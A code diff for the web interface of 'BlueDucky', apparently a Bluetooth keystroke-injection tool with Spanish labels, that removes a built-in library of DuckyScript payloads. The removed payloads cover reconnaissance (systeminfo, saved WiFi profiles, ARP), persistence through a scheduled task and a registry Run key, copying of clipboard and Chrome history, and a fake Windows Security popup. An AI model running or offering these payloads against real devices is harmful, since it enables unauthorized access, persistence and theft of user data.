@@ -356,35 +356,6 @@ footer{height:30px;background:#010304;border-top:1px solid var(--g3);
 //];
 let DEVICES = [];
 
-const PAYLOADS = {
-  RECON:[
-    {id:'r1',name:'System Info Dump',desc:'systeminfo completo via CMD',tags:['win','cmd'],
-     script:'REM System Info\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd /k systeminfo\nENTER'},
-    {id:'r2',name:'WiFi Credentials',desc:'Lista perfiles WiFi guardados',tags:['win','creds'],
-     script:'REM WiFi Creds\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER'},
-    {id:'r3',name:'Net + ARP Scan',desc:'ipconfig, ARP table, DNS cache',tags:['win','network'],
-     script:'REM Net Recon\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING ipconfig /all\nENTER\nDELAY 300\nSTRING arp -a\nENTER'},
-  ],
-  PERSIST:[
-    {id:'p1',name:'Scheduled Task',desc:'Crea tarea diaria en Task Scheduler',tags:['win','persist'],
-     script:'REM Sched Task\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING schtasks /create /tn "SysUpdate" /tr calc.exe /sc daily /f\nENTER'},
-    {id:'p2',name:'Registry Startup',desc:'Entrada en HKCU\\Run',tags:['win','registry'],
-     script:'REM Registry\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysCheck /t REG_SZ /d calc.exe /f\nENTER'},
-  ],
-  EXFIL:[
-    {id:'e1',name:'Clipboard Grab',desc:'Captura portapapeles a archivo temp',tags:['win','ps'],
-     script:'REM Clipboard\nDELAY 500\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 500\nSTRING Get-Clipboard | Out-File $env:TEMP\\cb.txt\nENTER'},
-    {id:'e2',name:'Chrome History',desc:'Copia historial de Chrome',tags:['win','browser'],
-     script:'REM Chrome\nDELAY 500\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" %TEMP%\\hist.db\nENTER'},
-  ],
-  SOCIAL:[
-    {id:'s1',name:'Fake Update Alert',desc:'Popup de actualización falsa',tags:['win','ui'],
-     script:'REM Fake Alert\nDELAY 500\nGUI r\nDELAY 400\nSTRING powershell -WindowStyle Hidden -Command "[System.Windows.Forms.MessageBox]::Show(\'Critical update required\',\'Windows Security\')"\nENTER'},
-    {id:'s2',name:'Lock Screen',desc:'Bloquea la sesión inmediatamente',tags:['win','lock'],
-     script:'REM Lock\nDELAY 500\nGUI l'},
-  ],
-};
-
 const CAT_CLR = {RECON:'#00d4ff',PERSIST:'#ffcc00',EXFIL:'#ff9933',SOCIAL:'#cc66ff'};
 
 let selectedDev = new Set();
@@ -733,7 +704,8 @@ function showStatus(){
 
 // ── INIT ──────────────────────────────────────────────────────────────────
 renderDevices(DEVICES);
-renderLib();
+//renderLib();
+cargarDirectorioSD();
 
 const WELCOME=[
   {t:'¡Te damos la bienvenida a BlueDucky ദ്ദി◝ ⩊ ◜)!',type:'sys',d:320},
